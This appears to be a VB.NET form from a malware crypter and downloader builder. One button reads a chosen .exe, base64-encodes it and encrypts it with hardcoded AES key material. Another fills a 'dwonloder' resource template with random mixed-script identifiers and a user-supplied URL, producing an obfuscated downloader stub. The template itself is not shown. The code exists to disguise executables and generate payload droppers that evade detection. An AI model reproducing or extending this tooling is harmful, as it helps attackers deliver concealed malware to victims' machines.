﻿Imports System.Security
Imports System.Security.Cryptography
Imports System.IO
Imports System.Runtime.InteropServices
Imports System.Text.RegularExpressions
Imports System.Text


Public Class Form5

    Private Sub FlatButton1_Click(sender As Object, e As EventArgs) Handles FlatButton1.Click


        Dim x As New OpenFileDialog
        With x

            .Filter = "|*.exe"
            .ShowDialog()
        End With

        FlatTextBox1.Text = x.FileName

     



        Dim lol As String = Convert.ToBase64String(IO.File.ReadAllBytes(FlatTextBox1.Text))
        Dim ss As String = Encrypt(lol)

        RichTextBox1.Text = ss




    End Sub

    Private Sub FlatButton2_Click(sender As Object, e As EventArgs) Handles FlatButton2.Click

        Dim fox3 As String = My.Resources.dwonloder

        Dim fox4 As String

        fox4 = fox3.Replace("%1%", xx(4)).Replace("%2%", xx(6)).Replace("%3%", xx(8)).Replace("%4%", xx(10)).Replace("%5%", xx(12)).Replace("%6%", xx(14)).Replace("%7%", xx(16)).Replace("%8%", xx(18)).Replace("%100%", rul.Text).Replace("%9%", xx(19)).Replace("%10%", xx(22)).Replace("%11%", xx(24)).Replace("%12%", xx(26)).Replace("%13%", xx(28)).Replace("%14%", xx(30)).Replace("%15%", xx(32)).Replace("%16%", xx(34)).Replace("%17%", xx(36)).Replace("%18%", xx(37)).Replace("%19%", xx(39)).Replace("%20%", xx(41)).Replace("%21%", xx(43)).Replace("%22%", xx(45)).Replace("%23%", xx(47))

        RichTextBox1.Text = fox4

    End Sub
    Public Function xx(ByVal len As Long)
        Dim rnd As New Random
        Dim arb As String = "корарӣднвородмсаоараӣрЧктдармракаа孩好你你你弟愛我好哪好рооиаакотдрррмоадӣӣра"
        Dim result As String = Nothing
        For i = 0 To len
            result = result & arb(rnd.Next(arb.Length))

        Next
        Return result
    End Function
    Public Function Encrypt(ByVal plainText As String) As String

        Dim passPhrase As String = "yourPassPhrase"
        Dim saltValue As String = "mySaltValue"
        Dim hashAlgorithm As String = "SHA1"
        Dim passwordIterations As Integer = 2
        Dim initVector As String = "@1B2c3D4e5F6g7H8"
        Dim keySize As Integer = 256
        Dim initVectorBytes As Byte() = Encoding.ASCII.GetBytes(initVector)
        Dim saltValueBytes As Byte() = Encoding.ASCII.GetBytes(saltValue)
        Dim plainTextBytes As Byte() = Encoding.UTF8.GetBytes(plainText)
        Dim password As New PasswordDeriveBytes(passPhrase, saltValueBytes, hashAlgorithm, passwordIterations)
        Dim keyBytes As Byte() = password.GetBytes(keySize \ 8)
        Dim symmetricKey As New RijndaelManaged()
        symmetricKey.Mode = CipherMode.CBC
        Dim encryptor As ICryptoTransform = symmetricKey.CreateEncryptor(keyBytes, initVectorBytes)
        Dim memoryStream As New MemoryStream()
        Dim cryptoStream As New CryptoStream(memoryStream, encryptor, CryptoStreamMode.Write)
        cryptoStream.Write(plainTextBytes, 0, plainTextBytes.Length)
        cryptoStream.FlushFinalBlock()
        Dim cipherTextBytes As Byte() = memoryStream.ToArray()
        memoryStream.Close()
        cryptoStream.Close()
        Dim cipherText As String = Convert.ToBase64String(cipherTextBytes)
        Return cipherText
    End Function
   
  
    Private Sub FlatButton3_Click(sender As Object, e As EventArgs) Handles FlatButton3.Click
        Form1.Show()
        Me.Hide()

    End Sub
End Class